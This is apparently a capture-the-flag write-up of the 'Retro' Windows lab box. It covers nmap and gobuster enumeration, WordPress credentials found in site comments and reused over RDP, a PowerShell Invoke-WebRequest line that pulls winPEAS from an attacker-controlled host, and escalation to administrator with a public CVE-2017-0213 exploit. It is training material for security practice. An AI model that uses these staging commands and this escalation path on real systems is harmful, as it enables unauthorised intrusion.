## nmap

```bash
Nmap scan report for 10.10.116.78
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2022-06-28T08:49:47+00:00
|_ssl-date: 2022-06-28T08:49:50+00:00; +10m03s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2022-06-27T08:49:02
|_Not valid after:  2022-12-27T08:49:02
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 10m02s, deviation: 0s, median: 10m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds

```

This is a **windows box** and Two ports are open port `80 http and port `3389 rdp`

**On port 80**

![image-20220628150527940](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628150527940.png)

After reading wade comments and looking the website. It is running the **WordPress** so this is theonw way to find out  

and the other way is running the gobuster.

## Gobuster

```bash
/retro                (Status: 301) [Size: 149] [--> http://10.10.116.78/retro/]
/Retro                (Status: 301) [Size: 149] [--> http://10.10.116.78/Retro/]
```

Finding more directory in **Retro/**

```bash
/wp-content           (Status: 301) [Size: 160] [--> http://10.10.116.78/retro/wp-content/]
/wp-includes          (Status: 301) [Size: 161] [--> http://10.10.116.78/retro/wp-includes/]
/wp-admin             (Status: 301) [Size: 158] [--> http://10.10.116.78/retro/wp-admin/] 
```

**http://10.10.116.78/retro/wp-login.php**

![image-20220628151452456](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628151452456.png)

The error massage shows *invalid username* . To find the username read the comments to find the username and password.

In this image wen can find the **username** which is **wade**

![image-20220628151830221](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628151830221.png)

And in this image we can find the password **parzival**

![image-20220628152034865](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628152034865.png)

Now login in WordPress  with **wade:parzival**

![image-20220628152309499](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628152309499.png)

Running wpscan there was nothing interesting was found 

After hitting the dead end I focused on Port 3389 rdp and login with the same credential found for WordPress  **wade:parzival** and login successfully .

Found user.txt on the Desktop 

![image-20220628160716450](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628160716450.png)

using **winpeas**

 ```powershell
  Invoke-WebRequest http://10.x.x.x:8000/win.exe -OutFile .\Documents\win.exe
 ```

find a [**CVE-2017–0213**](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213/Binaries), and decide to use this exploit to escalate our privilege on the box.

![image-20220628172148636](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628172148636.png)

After extracting it we run the .exe file

![image-20220628172407779](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628172407779.png)

![image-20220628172524598](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628172524598.png)

**root flag** is in *administrator/Desktop*

![image-20220628173100846](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220628173100846.png)